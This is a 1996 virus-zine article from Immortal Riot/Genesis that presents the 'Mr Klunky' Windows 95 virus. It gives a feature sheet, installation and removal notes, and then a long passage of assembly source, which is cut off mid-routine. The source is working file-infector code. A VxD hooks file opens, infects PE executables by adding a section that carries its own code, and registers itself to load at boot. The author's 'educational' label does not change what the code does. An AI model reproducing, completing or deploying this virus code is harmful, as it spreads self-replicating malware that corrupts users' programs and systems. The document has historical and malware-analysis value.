Insane Reality issue #8 - (c)opyright 1996 Immortal Riot/Genesis - REALITY.022

Article: Mr Klunky
Author: DV8 [IRG]

% Mr Klunky virus by DV8 [IRG] %
________________________________

IRG are proud to bring you the worlds first fully Windows '95 compatible 
virus. It is not version specific, and is also the worlds first Windows '95
TSR virus. It is a fast infector of Win95 PE and DLL files, and creates its
own VxD (Virtual Driver).

It should be noted that this is an accademic/educational version. It's sole
purpose is to teach people its methods, so all 'in the wild' features have
been REMOVED.

It should also be noted that MASM 6.11 was used to compile this. You can't 
use TASM and you'll need the Win95 DDK include files. Since (like all of
Microsofts products) MASM works like a programmers April Fools' joke, the
binary is around 7K even though the virus only has 3K of code. The rest is 
null data (go look at the debug script at the end of this article). DV8 
didn't have time to write an LE stripper, so we'll have to live with it for
the time being.

Files Included: MRKLUNKY.ASM
                MRKLUNKY.DEF
		MAKEFILE
		MRKLUNKY.SCR creates - LOAD-MRK.COM
				     - UNLD-MRK.COM
				     - MRKLUNKY.VXD

- _Sepultura_

;=[BEGIN MRKLUNKY.ASM]=======================================================

Comment @
 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³                                                                            ³
 ³ o       o           oo     ooo   o                        o                ³
 ³ooo     ooo         ooo     oo   oo                       oo                ³
 ³ ooo   ooo           oo    oo   ooo                      ooo                ³
 ³ oooo oooo           oo   oo     oo                       oo                ³
 ³ oo ooo oo   o  oo   oo  oo      oo oooo ooo   ooo ooo    oo  oooo ooo   oo ³
 ³ oo  o  oo  ooooooo  oo oo       oo  oo   ooo ooo ooooo   oo   oo   oo   ooo³
 ³ oo     oo   ooo  o  oooo        oo  oo   oo   oooo  oo   ooo oo    oo   oo ³
 ³ oo     oo   oo      oo oo       oo  oo   oo   ooo   oo   ooooo     oo   oo ³
 ³ oo     oo   oo      oo  oo      oo  oo   oo   oo    oo   oo oo     oo   oo ³
 ³ oo     oo   oo      oo   oo     oo  oo   oo   oo    oo   oo  oo    oo   oo ³
 ³ oo     oo   oo      oo    oo    oo  oo   oo   oo    oo   oo   oo   oo   oo ³
 ³ oo     oo   oo      oo     oo   oo   oooooo   oo    oo   oo    oo   oooooo ³
 ³oooo   oooo oooo    oooo    ooo oooo   ooo oo oooo  oooo oooo  oooo   ooooo ³
 ³                                                                         oo ³
 ³                                                                         oo ³
 ³  o                                 b y                                  oo ³
 ³ oo                                                                      oo ³
 ³ooo                                D V 8                                 oo ³
 ³ oo                                                                      oo ³
 ³ oo                                 o f                                  oo ³
 ³ oo                                                                      oo ³
 ³ oo              I m m o r t a l  R i o t  /  G e n e s i s              oo ³
 ³ oo                                                                      oo ³
 ³ oo                                                                      oo ³
 ³ oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo ³
 ³  oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo  ³
 ³                                                                            ³
 ÆÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
 ³                                                                            ³
 ³                                                                            ³
 ³               Dedicated (by an old Smurfophiliac) to smurfs                ³
 ³                                                                            ³
 ³                   everywhere, particularly Smurfette...                    ³
 ³                                                                            ³
 ³                           Mmmmmm.. What a babe!                            ³
 ³                                                                            ³
 ³                                                                            ³
 ÆÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
 ³                                                                            ³
 ³ Versions      o Depends on which way you compile it...                     ³
 ³                 1.00 - PE EXE infection.                                   ³
 ³                 1.01 - PE EXE infection in debug mode (published version). ³
 ³                 1.02 - PE EXE/DLL infection.                               ³
 ³                 1.03 - PE EXE/DLL infection in debug mode.                 ³
 ³                                                                            ³
 ³ Alias         o Mr K, MrK and anything else the AV come up with ;]         ³
 ³                                                                            ³
 ³ Origin        o Australia.                                                 ³
 ³                                                                            ³
 ³ Release Date  o Friday the 13th of December 1996.                          ³
 ³                                                                            ³
 ³ Platform      o PC running Windows 95.                                     ³
 ³                                                                            ³
 ³ Type          o Resident fast PE infector, infects Windows 95 boot         ³
 ³                 process.                                                   ³
 ³                                                                            ³
 ³ Targets       o .EXE (or .DLL) files of the PE type.                       ³
 ³                                                                            ³
 ³ Size          o Depends on which version you have.                         ³
 ³               o Version 1.00                                               ³
 ³                 Infected EXE/DLL files increase in size by 7791 bytes.     ³
 ³                 Driver (VxD) file size is 6631 bytes.                      ³
 ³               o Version 1.01                                               ³
 ³                 Infected EXE/DLL files increase in size by 7939 bytes.     ³
 ³                 Driver (VxD) file size is 6779 bytes.                      ³
 ³               o Version 1.02                                               ³
 ³                 Infected EXE/DLL files increase in size by 7799 bytes.     ³
 ³                 Driver (VxD) file size is 6639 bytes.                      ³
 ³               o Version 1.03                                               ³
 ³                 Infected EXE/DLL files increase in size by 7951 bytes.     ³
 ³                 Driver (VxD) file size is 6791 bytes.                      ³
 ³               o The "real" size of the actual code is approx 3KB. The rest ³
 ³                 of the size is mostly blank space, thanks to MASM (yech)!  ³
 ³                                                                            ³
 ³ Payload       o None.                                                      ³
 ³                                                                            ³
 ³ Features      o Infects all eligible files opened for any reason.          ³
 ³               o Saves, bypasses and restores file attributes.              ³
 ³               o Fully compliant Windows 95 approach, which should          ³
 ³                 guarantee compatability with future Windows 95 upgrades    ³
 ³                 (with the exception of the following item).                ³
 ³               o Reliably and compatably locates the entry point for needed ³
 ³                 KERNEL32.DLL functions, regardless of Windows 95 version.  ³
 ³                 This allows needed system functions to be called at need.  ³
 ³               o Creates a driver (VxD) file and adds an entry to the       ³
 ³                 registry so that it is loaded whenever Windows 95 starts   ³
 ³                 (thus infecting the Win 95 "boot" process).                ³
 ³               o Correctly locates the actual windows and/or system         ³
 ³                 directories.                                               ³
 ³               o Uses dynamic memory allocation, reducing various system    ³
 ³                 footprints dramatically.                                   ³
 ³               o Passes control to origional host with all registers clean  ³
 ³                 and environment preserved.                                 ³
 ³               o No polymorphism.                                           ³
 ³               o No encryption.                                             ³
 ³               o No retrovirus functionality.                               ³
 ³               o No anti-heusitic stuff.                                    ³
 ³               o No stealth.                                                ³
 ³               o No tunnelling type stuff.                                  ³
 ³               o No code armouring.                                         ³
 ³                                                                            ³
 ³ Compiling     o MASM 6.11 (you'll need the Windows 95 DDK .INC files too). ³
 ³                 Ignore the compile errors.                                 ³
 ³                                                                            ³
 ³ Installation  o Just run LOAD.EXE from a DOS shell inside Win 95.          ³
 ³                                                                            ³
 ³ Removal       o Reboot infected PC.                                        ³
 ³               o Press <F8> at the "Starting Windows 95..."                 ³
 ³               o Select the "Command Prompt Only" option.                   ³
 ³               o Delete all infected files (if you ran a debug verison of   ³
 ³                 Mr Klunky C:\LOG.LOG will contain a list of all infected   ³
 ³                 file).                                                     ³
 ³               o Restore all standard DOS 8.3 named files in the C:\WINDOWS ³
 ³                 and C:\WINDOWS\SYSTEM directories.                         ³
 ³               o Boot into Windows 95 (you will get an error about the VxD  ³
 ³                 Mr Klunky uses being missing, ignore this).                ³
 ³               o Restore all missing files (you _DID_ make a backup didn't  ³
 ³                 you?!).                                                    ³
 ³               o Run REGEDIT.EXE and do a search for a key called           ³
 ³                 "MrKlunky" and delete it.                                  ³
 ³                                                                            ³
 ³ Scanning      o Well... Any signature scanner will be able to spot it      ³
 ³                 after it is next updated.                                  ³
 ³               o Any self checking PE file will spot it.                    ³
 ³               o Any integrity checker will spot it.                        ³
 ³               o Hey! This is an educational version! WTF did you expect    ³
 ³                 from it!!!                                                 ³
 ³                                                                            ³
 ³ Side effects  o Nothing important I know of... MS would need to make some  ³
 ³                 pretty fundamental OS changes in Windows 95.               ³
 ³               o No infected file will run under NT |]                      ³
 ³                                                                            ³
 ³ To do's       o Just look at the "Features" section!                       ³
 ³               o Other bits I removed to go back in.                        ³
 ³               o Some alternative (and even more compatable) ideas to be    ³
 ³                 tried instead of the approaches used.                      ³
 ³                                                                            ³
 ³ Greetz        o Sepultura (look! It's ready for the Zine!)                 ³
 ³               o Metabolis (Injected with the poison.)                      ³
 ³               o Qark (Hullo? Anyone seen this worthy?)                     ³
 ³               o TZ (Sigh... Repetition.)                                   ³
 ³               o Priest (Where TF are you anyway??)                         ³
 ³               o Dark Angel (Everyone seems to have vanished!)              ³
 ³               o Halflife (Wewp! A live one!)                               ³
 ³               o Jookie (Hey dude.)                                         ³
 ³               o KD (Told ya this was here!)                                ³
 ³               o Quantum (Hope ya like Mr K bud.)                           ³
 ³               o The Unforgiven (Email, email, email...)                    ³
 ³               o Anyone else I missed ;] You all know I love you |}         ³
 ³                                                                            ³
 ³ Other notes   o Please remember that this is an, um, scholarly version     ³
 ³                 only. It won't last 5 minutes in the wild, so don't even   ³
 ³                 think of releasing it or of criticising me for anything    ³
 ³                 about it!                                                  ³
 ³               o Make sure you read the article first!                      ³
 ³               o Be damn careful if you play with a non-debug version!      ³
 ³                 I infected my machine inadvertantly heaps of times :(      ³
 ³                 Twice it was with a non-debug version. Doh! Had to restore ³
 ³                 from backup!                                               ³
 ³               o Enjoy!                                                     ³
 ³                                                                            ³
 ³                                                                    -DV8/IRG³
 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
@
  .386p

  .XLIST
  INCLUDE VMM.Inc
  INCLUDE IFSMGR.Inc
  .LIST






; *** VxD code starts here ***

; This file (up to the MrK_PE_Code_Start label) comprises the VxD portion
; of Mr Klunky. The section from the MrK_PE_Code_Code_Start label is (to
; the VxD portion) data and of little import.

; The VxD portion (once loaded into memory) hooks into the file system.

; Whenever a file is opened for any reason (Windows 95 always opens a
; file before executing it) it is investigated and (if it's a PE file
; meeting the appropriate criteria - including not already infected)
; infected.

; The infection process is, in essence, simple. The headers of the file
; are processed and a new section is created.

; Next a portion of code (beginning at the MrK_PE_Code_Start label) is
; written to the new program entry point (this code is slightly modified
; so control can passed back to the victim correctly). Immediately
; following this will be written the VxD code.

; Finally the modified header area will be written back to the beginning
; of program.

; The program will now be allowed to execute normally.



; If this line is uncommented Mr Klunky will generate a file (C:\LOG.LOG)
; containing the drive, path and name of every file infected - it will also
; allow MrKlunky to be dynamically unloaded.
MRK_Debug               equ 00h



; If this line is uncommented Mr Klunky will infect .DLL files (SLOW!).
;MRK_Infect_DLLs         equ 00h



; Various internally used equations.
MRK_Infected_Marker     equ 00F00F00h


; Equations used in traversing the contents of PE files.
MZ_HeaderSize		equ 40h
PE_HeaderSize		equ 18h
PE_OptionalHeaderSize	equ 5Fh
PE_TotalHeaderSize	equ (PE_HeaderSize + PE_OptionalHeaderSize)

PE_NumberOfSections	equ 06h
PE_SizeOfOptionalHeader equ 14h

PE_SizeOfCode		equ (PE_HeaderSize + 04h)
PE_AddressOfEntryPoint	equ (PE_HeaderSize + 10h)
PE_SectionAlignment	equ (PE_HeaderSize + 20h)
PE_FileAlignment	equ (PE_HeaderSize + 24h)
PE_SizeOfImage		equ (PE_HeaderSize + 38h)
PE_SizeOfHeaders	equ (PE_HeaderSize + 3Ch)

Prev_VirtualSize	equ (-28h + 08h)
Prev_VirtualAddress	equ (-28h + 0Ch)
Prev_SizeOfRawData	equ (-28h + 10h)
Prev_PointerToRawData	equ (-28h + 14h)



; Size of the binary data patched into any infected PE EXE.
PE_Patch_Size           equ (_lpStoredVxD - MrK_PE_Code_Start)
MaxStringLen            equ 1000d



; Function ordinal definitions.
IFS_Open		equ 24h



; Set some build options and declare the device and it's characteristics.
 ; Major version is 1.
 MrK_MajVer              equ 1

 ; Minor version depends on compile options.
 IFNDEF MrK_Infect_DLLs
   IFNDEF MrK_Debug
     MrK_MinVer          equ 0
   ELSE
     MrK_MinVer          equ 1
   ENDIF
 ELSE
   IFNDEF MrK_Debug
     MrK_MinVer          equ 2
   ELSE
     MrK_MinVer          equ 3
   ENDIF
 ENDIF

 ; My device ID.
 MrKlunky_Device_ID      equ 0D00Dh

 ; Declare the VxD entry point and other characteristics.
 Declare_Virtual_Device MRKLUNKY, MrK_MajVer, MrK_MinVer, \
         MRKLUNKY_Control, MrKlunky_Device_ID



; Put *everything* in a locked data segment. This way nothing is paged
; and all code is read/write.
VxD_LOCKED_DATA_SEG

  ; Locked code segment for the code.
  VxD_LOCKED_CODE_SEG

    ; Control dispatch setup.
    BeginProc MRKLUNKY_Control

      ; Handler for system boot device initialisation.
      Control_Dispatch INIT_COMPLETE, MRKLUNKY_Device_Init

      ; Handler for dynamic device initialisation.
      Control_Dispatch SYS_DYNAMIC_DEVICE_INIT, MRKLUNKY_Device_Init

; If the MRK_Debug equation exists allow the VxD
; to be dynamically unloaded.
IFDEF MRK_Debug
      ; Handler to dynamically unload Mr Klunky (Debug version only).
      Control_Dispatch SYS_DYNAMIC_DEVICE_EXIT, MRKLUNKY_System_Exit
ENDIF

      ; Handler to unload Mr Klunky when the system shuts down.
      Control_Dispatch SYSTEM_EXIT, MRKLUNKY_System_Exit

      ; Default to success for unhandled events.
      clc
      ret
    EndProc MRKLUNKY_Control



    ; Initialise routine for dynamic/system load.
    BeginProc MRKLUNKY_Device_Init
      ; Try to open my driver in the Windows
      ; System dir.
      VMMCall Get_Exec_Path                   ; Get VMM32.VxD (system) path.
      call DeriveNameAndOpen                  ; Open Mr K in there.
      jnc  VxDFileOpen                        ; On success continue.

      ; Try to open my driver in the Windows dir.
      VMMCall Get_Config_Directory            ; Get config (Windows) path.
      call DeriveNameAndOpen                  ; Open Mr K in there.
      jnc  VxDFileOpen                        ; On success continue.

      ; Try to open my driver in the current dir.
      mov  esi, offset _lpMrKlunkyFileName    ; Try in the current dir.
      call R0_OpenFileRead                    ;
      jc InstallFail                          ; Error exit.

    VxDFileOpen:
      ; Get my size.
      mov  eax, 0D800h			      ; R0_GETFILESIZE
      VxDCall IFSMgr_Ring0_FileIO	      ;
      jc   InstallFail_Close		      ; Error exit.
      mov  _ddMrK_VxD_Size, eax               ; Save size.
      mov  _dwMrK_VxD_Size, ax                ; Save size.
      xchg ecx, eax			      ; ESI = file size.

      ; Allocate memory.
      call R0_Alloc                           ;
      je   InstallFail_Close		      ; Error exit.
      mov  lpVxDBuffer, esi		      ; Save handle.

      ; Read me.
      call R0_ReadFromStart                   ;
      jc   InstallFail_Close		      ; Error exit.

      ; Close the file.
      mov  eax, 0D700h			      ; R0_CLOSEFILE
      VxdCall IFSMgr_Ring0_FileIO	      ;

      ; Hook into the file monitoring system.
      mov  eax, offset MRKLUNKY_FileHandler   ; Install our API hook.
      push eax				      ;
      VxDCall IFSMgr_InstallFileSystemApiHook ;
      add  esp, 4			      ; Restore stack.
                                              ;
      mov  NextIFSHook, eax		      ; Save address of next hooker.
                                              ;
      or   eax, eax			      ; EAX = 0?
      jz   InstallFail			      ; Yep. Failed.

      clc				      ; Success!
      ret				      ; Back to VxDLdr...

    InstallFail_Close:
      ; Close the file.
      mov  eax, 0D700h			      ; R0_CLOSEFILE
      VxdCall IFSMgr_Ring0_FileIO	      ;

    InstallFail:
      stc				      ; Failure!
      ret				      ; Back to VxDLdr...
    EndProc MRKLUNKY_Device_Init



    ; Deinitialise routine for system shutdown.
    BeginProc MRKLUNKY_System_Exit
      ; Dealloc buffer.
      mov  esi, lpVxDBuffer		      ; Handle to buffer.
      call R0_Dealloc			      ;

      ; Remove our file monitoring hook.
      mov  eax, offset MRKLUNKY_FileHandler   ; Uninstall our API hook.
      push eax				      ;
      VxDCall IFSMgr_RemoveFileSystemApiHook  ;
      add  esp, 4			      ; Restore stack.
                                              ;
      or   eax, eax			      ; EAX=0?
      jnz  UninstallFail		      ; Nope. Failure.

      clc				      ; Success!
      ret				      ; Back to VxDLdr...

    UninstallFail:
      stc				      ; Failure!
      ret                                     ; Back to VxDLdr...
    EndProc MRKLUNKY_System_Exit



    ; Builds a filespec for Mr Klunky's VxD in
    ; the dir pointed to by EDX.
    BeginProc DeriveNameAndOpen

      ; Go to terminating NUL.
      mov  ecx, MaxStringLen                  ; Max 1000 characters.
      mov  edi, edx                           ; EDI = EDX = Filespec.
      xor  al, al                             ; Look for 0.
      repne scasb                             ;
      sub  edi, edx                           ;

      ; Save these.
      push edi                                ;
      push edx                                ;

      ; Allocate a buffer of heap space.
      mov  ecx, MaxStringLen                  ; 1000 chars should be ample.
      call R0_Alloc                           ;

      ; Restore saved regs to different regs.
      pop  edi                                ; Was EDX.
      pop  ecx                                ; Was EDI.

      je   DNAOExit                           ;

      ; Save all registers.
      pushad                                  ;

      ; Copy the source dir into the temp buffer.
      xchg esi, edi                           ; Swap ESI & EDI.
      push edi                                ; < Save these.
      push ecx                                ; <
      rep  movsb                              ; ECX = source str length.
      pop  ecx                                ; < Restore these.
      pop  edi                                ; <

      ; Go to terminating NUL.
      push ecx                                ; Save this.
      xor  al, al                             ; NUL.
      repne scasb                             ; Find it.
      pop  eax                                ; Was ECX.

      ; Go back to last '\'.
      sub  eax, ecx                           ; < ECX = Length of string.
      xchg ecx, eax                           ; <
      mov  al, '\'                            ;
      std                                     ; Scan backwards.
      repne scasb                             ;
      cld                                     ; Normal string direction.
      add  edi, 2                             ; Char just after '\'.

      ; Append 'MrKlunky.VxD' to constructed dir.
      mov  esi, offset _lpMrKlunkyFileName    ; From here.
      mov  ecx, 13d                           ; This many chars.
      rep  movsb                              ;

      ; Restore all registers.
      popad                                   ;

      ; Open the file.
      call R0_OpenFileRead                    ; ESI = our string.

      ; Deallocate the buffer, retaining flags.
      pushf                                   ;
      call R0_Dealloc                         ; ESI = our buffer.
      popf                                    ;

    DNAOExit:
      ret
    EndProc DeriveNameAndOpen


                                               
    ; Opens file specified by [ESI] for
    ; read, returns handle in EBX.
    BeginProc R0_OpenFileRead
      mov  ebx, 0000FF00h                     ; Compat read, return errors.
      mov  edx, 00000001h                     ; No cache, open existing.

      jmp  R0_OpenFile                        ; Continue.

    ; Opens file specified by [ESI] for
    ; read/write, returns handle in EBX.
    BeginProc R0_OpenFileWrite
      mov  ebx, 0000FF02h                     ; Compatable read, commit on
                                              ; write, return errors.

      mov  edx, 00000011h		      ; R0_NO_CACHE, open existing.

    R0_OpenFile:
      mov  eax, 0D501h                        ; R0_OPENCREAT_IN_CONTEXT
      xor  ecx, ecx			      ; No attributes.
      VxDCall IFSMgr_Ring0_FileIO	      ;

      xchg ebx, eax			      ; EBX = return value (handle).
      ret
    EndProc R0_OpenFileWrite
    EndProc R0_OpenFileRead



    ; Returns a handle to a heap buffer of the
    ; requested size in ESI, if possible.
    ;
    ; Returns equal on error.
    BeginProc R0_Alloc
      push ecx                                ; Save this.

      push HEAPSWAP			      ; Swappable memory.
      push ecx				      ; This size.
      VMMCall _HeapAllocate		      ;
      add  esp, (4*2)			      ; Restore stack.

      cmp  eax, 0			      ; Error returned?
      xchg eax, esi                           ; Handle in ESI.

      pop  ecx                                ; restore this.
      ret
    EndProc R0_Alloc



    ; Free up previously allocated heap buffer,
    ; requires handle in ESI.
    BeginProc R0_Dealloc
      push 0				      ; Reserved.
      push esi				      ; Free this buffer.
      VMMCall _HeapFree 		      ;
      add  esp, (4*2)			      ; Restore stack.
      ret
    EndProc R0_Dealloc



    ; Resize and existing heap buffer ([ESI])
    ; to the size in ECX.
    BeginProc R0_ReAlloc
      push ecx				      ; Save this.

      push HEAPNOCOPY			      ; Don't bother copying old buffer.
      push ecx				      ; Resize to this.
      push esi				      ; Handle to old buffer.
      VMMCall _HeapReAllocate		      ;
      add  esp, (4*3)			      ; Restore stack.

      xchg eax, esi			      ; ESI=Return value.
      cmp  esi, 0			      ; Error check.

      pop  ecx				      ; Restore it.
      ret
    EndProc R0_ReAlloc



    ; Read ECX bytes from open file (EBX = handle),
    ; from beginning of file.
    BeginProc R0_ReadFromStart
      xor  edx, edx			      ; From file start.
      mov  eax, 0D600h			      ; R0_READFILE
      VxDCall IFSMgr_Ring0_FileIO	      ;

      ret
    EndProc R0_ReadFromStart



    ; Just so everyone knows
    CopyRight   db 13d, 13d
                db "[Mr Klunky v", '0' + MrK_MajVer, ".0"
                db '0' + MrK_MinVer, "]", 13d
                db "Copyright (C) DV8 of Immortal Riot/Genesis, "
                db "Friday 13th of December 1996.", 13d
                db 13d



    ; Actual file handler.
    BeginProc MRKLUNKY_FileHandler
      ; Handler setup.
      push ebp				      ; For C compatiblity.
      mov  ebp, esp			      ;
      sub  esp, 20h			      ;

    ;	The following structure is passed to us on the stack and now has the
    ; current positions, relative to EBP :-
    ;	00h - Initial value of EBP.
    ;	04h - Return address of caller.
    ;	08h - Address of FSD function.
    ;	0Ch - Function ID.
    ;	10h - Drive.
    ;	14h - Type of resource.
    ;	18h - Code page.
    ;	1Ch - Pointer to IOREQ record.
    ;		00h(dw) - Length of user buffer.
    ;		02h(db) - Status flags.
    ;		03h(db) - Requests' User ID.
    ;		04h(dw) - File handle's System File Number.
    ;		06h(dw) - Process ID.
    ;		08h(dd) - Unicode path.
    ;		0Ch(dd) - Secondary data buffer.
    ;		10h(dd) - Primary data buffer.
    ;		14h(dw) - Handling options.
    ;		16h(dw) - Error code.
    ;		18h(dw) - Resource handle.
    ;		1Ah(dw) - File/find handle.
    ;		1Ch(dd) - File position.
    ;		20h(dd) - Extra API params.
    ;		24h(dd) - Extra API params.
    ;		28h(dw) - Address of IFSMgr event for async requests.
    ;		2Ah(db) - Start of provider work space.

      push ebx				      ; Save registers.
      push ecx				      ;

      ; Make sure we don't process our own
      ; file calls.
      cmp  Already_Entered, 0		      ; Already Entered?
      jne  No_Reentrancy		      ; Yep, don't process.
      mov  Already_Entered, 1		      ; Nope, set entered flag.

      ; Windows 95 does a file open when any
      ; program is run.
      cmp  dword ptr [ebp+0Ch], IFS_Open      ; Is this a file open?
      jne  Continue			      ; Nope... Forget it.

      ; Allocate a buffer for the converted
      ; Unicode string.
      mov  ecx, MaxStringLen                  ; 1,000 chars should be enough.
      call R0_Alloc                           ;
      je   Continue			      ; Error exit.
      mov  lpNameBuffer, esi		      ; Save the handle.

      ; Initialise drive letter portion of
      ; ASCII path.
      mov  ebx, esi                           ; EBX = ESI = Ptr to BCS buffer.
      mov  edx, (MaxStringLen - 1)            ; Max size of output buffer.
                                              ;
      mov  ecx, [ebp+10h]		      ; Put drive in ECX
      cmp  cl, 0FFh			      ; UNC drive?
      je   SkipVol                            ; Yep, Skip drive letter.
                                              ;
      sub  edx, 2                             ; Adjust max output buffer size.
                                              ;
      add  cl, 40h                            ; < Put ASCII drive in buffer.
      mov  byte ptr [ebx], cl                 ; <
                                              ;
      inc  ebx                                ; Skip the drive spec.
                                              ;
      mov  byte ptr [ebx], 3Ah		      ; Follow drive letter with a ':'.
      inc  ebx				      ;
    SkipVol:                                  ;

      ; Do the actual Unicode -> ASCII.
      xor  ecx, ecx			      ; Character set (BCS_WANSI).
      push ecx				      ;
      push edx				      ; Max size of output buffer.
      mov  eax, [ebp+1Ch]		      ; Dereferance.
      mov  ecx, [eax+0Ch]		      ; Ptr to Unicode path (input).
      add  ecx, 4			      ;
      push ecx                                ;
      push ebx				      ; Ptr to BCS buffer (output).
      VxdCall UniToBCSPath		      ;
      add  esp, 4*4			      ; Fix the stack.

      ; OK. It's been converted. Go to
      ; string end.
      mov  edi, esi                           ; EDI = ASCII filespec.
      xor  al, al                             ; NUL
      mov  ecx, MaxStringLen                  ; 1000 char max scan.
      repne  scasb			      ;
                                              ;
      or   ecx, ecx			      ; Did we hit buffer end?
      jz   DeallocContinue                    ; Yup. Abort.

; If the MRK_Infect_DLLs equation exists allow
; our code to infect DLL files too.
IFDEF MRK_Infect_DLLs
      ; If it's a .EXE check it.
      cmp  dword ptr [edi-5], "EXE."          ; Is the file extension .EXE?
      je   PossiblePE			      ; Nope, skip this file.

      ; If it's a .DLL check it.
      cmp  dword ptr [edi-5], "LLD."          ; Is the file extension .DLL?
      jne  DeallocContinue		      ; Nope, skip this file.
    PossiblePE:
ELSE
      ; If it's a .EXE check it.
      cmp  dword ptr [edi-5], "EXE."          ; Is the file extension .EXE?
      jne  DeallocContinue		      ; Nope, skip this file.
ENDIF

      ; Get the file's attributes.
      mov  eax, 4300h                         ; R0_FILEATTRIBUTES,GET_ATTRIBUTES
      VxDCall IFSMgr_Ring0_FileIO             ; ESI = ASCII filespec.
      jc   DeallocContinue                    ; Error exit.
                                              ;
      push ecx                                ; Save to restore later.

      ; Nullify the attributes.
      mov  eax, 4301h                         ; R0_FILEATTRIBUTES,SET_ATTRIBUTES
      xor  ecx, ecx                           ; No attributes.
      VxDCall IFSMgr_Ring0_FileIO             ;
      jc   RestoreExit                        ; Error exit.

      ; Open the file.
      call R0_OpenFileWrite                   ;
      jc   RestoreExit                        ; Abort on error.

      ; Allocate a buffer on the heap.
      mov  ecx, MZ_HeaderSize		      ; This size.
      call R0_Alloc                           ;
      je   CloseFuck			      ; Yep, error exit.

      ; Read the DOS Header.
      call R0_ReadFromStart                   ;
      jc   CloseFuck			      ; Exit on error.

      ; Get the size of the file.
      mov  eax, 0D800h			      ; R0_GETFILESIZE
      VxDCall IFSMgr_Ring0_FileIO	      ;
      jc   CloseFuck			      ; Exit on error.

      ; Is it an MZ EXE?
      cmp  word ptr [esi], 'ZM'               ; Check for MZ signature.
      jne  CloseFuck			      ; Not there. Not a PE.

      ; If already infected forget it.
      cmp [esi+28h], MRK_Infected_Marker      ; Our sign there?
      je  CloseFuck                           ; Yep, bibi.

      ; Get and check location of PE header.
      mov  ecx, [esi+3Ch]		      ; Get location of PE signature.
      cmp  ecx, 0			      ; Is it zero?
      je   CloseFuck			      ; Yep, not a PE.
					      ;
      cmp  ecx, eax			      ; Is it greater than file size?
      jg   CloseFuck			      ; Yep, not a PE.

      ; Resize the heap buffer.
      mov  edi, ecx			      ; EDI=Start of PE header.
      add  ecx, PE_TotalHeaderSize	      ; Make room for image file header.
      call R0_ReAlloc			      ;
      je   CloseFuck			      ; Error exit.

      ; Read the file, including all of the
      ; PE image file header fields.
      call R0_ReadFromStart                   ;
      jc   CloseFuck			      ; Exit on error.

      ; Check if it's a PE file.
      cmp  [esi+edi], 00004550h 	      ; Is it "PE\0\0"?
      jne  CloseFuck			      ; Nope, not a PE.

      ; YAY! We got a Windows 95 file!
      ; Resize the buffer.
      mov  ecx, [esi+edi+PE_SizeOfHeaders]    ; Make room for Header & Sections.
      call R0_ReAlloc			      ;
      je   CloseFuck			      ; Error exit.

      ; Read all headers and sections.
      call R0_ReadFromStart                   ;
      jc   CloseFuck			      ; Exit on error.

      ; Mark as infected.
      mov [esi+28h], MRK_Infected_Marker      ; Put in our sign.

      ; Calculate space combined headers
      ; occupy and space sections occupy.
      xor  ecx, ecx			      ;
      mov  cx, word ptr [esi+edi+PE_SizeOfOptionalHeader]
      add  ecx, edi			      ;
      add  ecx, PE_HeaderSize		      ; ECX = Combined headers' area.
      sub  eax, ecx			      ; EAX - Total_Size = Section area.

      ; Calculate number of possible section
      ; entries in the area.
      push ecx				      ; Save this for later.
      xor  edx, edx			      ; EDX:EAX = 00000000:Area_Size.
      mov  ecx, 28h			      ;
      div  ecx				      ; Section area / Section size.

      ; Check there is at least one entry spare.
      xor  edx, edx			      ; < EDX = Number of entries used.
      mov  dx, [esi+edi+PE_NumberOfSections]  ; <
					      ;
      cmp  eax, edx			      ; Compare them.
      jng  CloseFuck			      ; Num used >= Num available. Bibi.
					      ;
      cmp  edx, 0FFFFh			      ; Max entries already?
      jge  CloseFuck			      ; Exit, no spare room.

      ; One more entry please.
      inc  word ptr [esi+edi+PE_NumberOfSections]

      ; Calculate end of current section entries.
      xchg eax, edx			      ; EAX = Number of entries.
      mul  ecx				      ;
      pop  ecx				      ; Combined headers' size.
      add  ecx, eax			      ; ECX = End of section entries.

      ; Calculate Virtual Address of new section.
      pushad				      ; Save regs.
					      ;
      add  ecx, esi			      ;
					      ;
      mov  eax, [ecx+Prev_VirtualAddress]     ; Previous virtual address...
      add  eax, [ecx+Prev_VirtualSize]	      ; ...+ previous virtual size...
      mov  ebx, [esi+edi+PE_SectionAlignment] ; < .../ section alignment...
      xor  edx, edx			      ; <
      div  ebx				      ; <
      inc  eax				      ; ...+ one...
      mul  ebx				      ; ...* section alignment.
					      ;
      mov  My_VirtualAddress, eax	      ; Store it.

      ; Calculate the actual size of the new section.
      mov  eax, _ddMrK_VxD_Size               ; VxD file's size...
      add  eax, PE_Patch_Size + MaxStringLen  ; ...+ size of patch + heap...
      push eax
      mov  ebx, [esi+edi+PE_FileAlignment]    ; < .../ file alignment...
      xor  edx, edx			      ; <
      div  ebx				      ; <
      inc  eax				      ; ...+ one...
      mul  ebx				      ; ...* file alignment.
					      ;
      mov  My_SizeOfRawData, eax	      ; Store it.

      ; Calculate the virtual size of the new section. ?
      pop  eax                                ; VxD size + patch code size.
      push eax                                ;
      mov  ebx, [esi+edi+PE_SectionAlignment] ; < .../ section alignment...
      xor  edx, edx			      ; <
      div  ebx				      ; <
      inc  eax				      ; ...+ one...
      mul  ebx				      ; ...* section alignment.
					      ;
      mov  My_PhysicalAddress, eax	      ; Store it.

      ; Calculate the start of the new section.
